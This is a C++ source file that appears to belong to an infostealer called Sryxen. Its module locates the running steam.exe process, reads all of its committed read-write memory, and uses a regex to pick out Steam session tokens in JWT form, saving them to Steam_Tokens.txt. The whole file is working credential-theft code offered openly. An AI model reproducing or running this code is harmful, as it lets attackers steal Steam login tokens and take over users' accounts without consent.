/*
Added error handling to ensure the program continues execution without crashing 
if the target process isn't running. Kept debug prints if inside #DEBUG.
*/

#include "Steam_Memory_Dumping.h"
#include <tlhelp32.h>
#include "Sryxen.hpp"
#include "Helper.h"

void ProcessScanner::Start() {
#ifdef DEBUG
    DEBUG_PRINT(L"Process Scanner Started");
#endif
    ProcessScanner scanner(L"steam.exe", std::regex(R"(eyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0[0-9a-zA-Z\.\-_]+)"));
#ifdef DEBUG
    DEBUG_PRINT(L"Process Scanner Finished");
#endif
}

ProcessScanner::ProcessScanner(const std::wstring& processName, const std::regex& pattern)
    : processName(processName), pattern(pattern) {
    hProcess = OpenProcessByName();
    if (hProcess) {
        Run();
    }
}

ProcessScanner::~ProcessScanner() {
    if (hProcess) {
        CloseHandle(hProcess);
    }
}

HANDLE ProcessScanner::OpenProcessByName() {
    HANDLE hProc = NULL;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (std::wstring(pe32.szExeFile) == processName) {
                hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return hProc;
}

std::vector<std::string> ProcessScanner::ExtractStringsByRegex(const std::vector<char>& data) {
    std::vector<std::string> matchedStrings;
    std::string currentString;

    for (char ch : data) {
        if (std::isalnum(ch) || std::ispunct(ch) || std::isspace(ch)) {
            currentString += ch;
        }
        else {
            if (!currentString.empty() && std::regex_search(currentString, pattern)) {
                matchedStrings.push_back(currentString);
            }
            currentString.clear();
        }
    }

    if (!currentString.empty() && std::regex_search(currentString, pattern)) {
        matchedStrings.push_back(currentString);
    }

    return matchedStrings;
}

std::vector<std::string> ProcessScanner::ScanProcessMemory() {
    std::vector<std::string> results;
    if (!hProcess) return results;

    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = 0;

    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) != 0) {
        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE) == PAGE_READWRITE) {
            std::vector<char> buffer(mbi.RegionSize);
            SIZE_T bytesRead;

            if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
                std::vector<std::string> extracted = ExtractStringsByRegex(buffer);
                results.insert(results.end(), extracted.begin(), extracted.end());
            }
        }
        address = reinterpret_cast<LPBYTE>(mbi.BaseAddress) + mbi.RegionSize;
    }

    return results;
}

void ProcessScanner::Run() {
    if (!hProcess) return;
    std::vector<std::string> tokens = ScanProcessMemory();
    if (!tokens.empty()) {
        SaveToFile("Steam_Tokens.txt", tokens);
    }
}
